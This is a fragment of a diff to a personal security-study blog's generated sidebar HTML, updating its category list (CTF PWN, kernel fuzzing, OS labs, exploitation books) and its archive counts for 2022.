href="/categories/study/book/%E6%8F%AD%E7%A7%98%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/">揭秘家用路由器0day漏洞挖掘技术</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/">程序员的自我修养：链接、装载与库</a><span class="category-list-count">7</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/daily/">daily</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/welcome/">welcome</a><span class="category-list-count">1</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/">CSAPP-lab</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/bomblab/">bomblab</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/datalab/">datalab</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/preparelab/">preparelab</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">32</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/">PWN</a><span class="category-list-count">32</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/">kernel pwn</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/">FUZZ</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/Syzkaller/">Syzkaller</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/Trinity/">Trinity</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/Linux-source/">Linux source</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/cve/">cve</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/knowledge/">knowledge</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/wp/">wp</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/uncategorized/">uncategorized</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/user-space-pwn/">user space pwn</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/user-space-pwn/cve/">cve</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/">wp</a><span class="category-list-count">14</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/asisctf/">asisctf</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/asisctf/asisctf2021/">asisctf2021</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/buuoj/">buuoj</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/l3hctf/">l3hctf</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/pwnable-kr/">pwnable.kr</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/susctf2022/">susctf2022</a><span class="category-list-count">2</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/">OS</a><span class="category-list-count">15</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/OS/Prepare/">Prepare</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/">lab1</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge1-what-is-make/">challenge1:what is make</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge2-qemu-gdb/">challenge2:qemu&gdb</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge3-go-into-protected-mode/">challenge3:go into protected mode</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge4-load-kernel-elf/">challenge4:load kernel elf</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge5-trace-stackframe/">challenge5:trace stackframe</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge6-interrupt-handle/">challenge6:interrupt handle</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/theory/">theory</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/Fuzz/">Fuzz</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/Fuzz/AFL/">AFL</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/cve/">cve</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/microcorruption/">microcorruption</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/UE4/">UE4</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/UE4/LowPoly/">LowPoly</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/course/">course</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/course/MIT-AI/">MIT-AI</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/course/static-program-analysis/">static_program_analysis</a><span class="category-list-count">5</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/golang/">golang</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/golang/start/">start</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/">pwn.college</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/Chapter01-Program-interaction/">Chapter01 Program interaction</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/Chapter02-Binary-file/">Chapter02 Binary file</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/Introduciton/">Introduciton</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/">study</a><span class="category-list-count">21</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/">book</a><span class="category-list-count">17</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/%E6%8F%AD%E7%A7%98%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/">揭秘家用路由器0day漏洞挖掘技术</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/">程序员的自我修养：链接、装载与库</a><span class="category-list-count">7</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/daily/">daily</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/welcome/">welcome</a><span class="category-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -1788,7 +1336,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title"><i class="fa fa-archive"></i> 归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022年04月</a><span class="archive-list-count">14</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021年12月</a><span class="archive-list-count">76</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022年05月</a><span class="archive-list-count">16</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021年12月</a><span class="archive-list-count">76</span></li></ul>
     </div>
   </div>
 
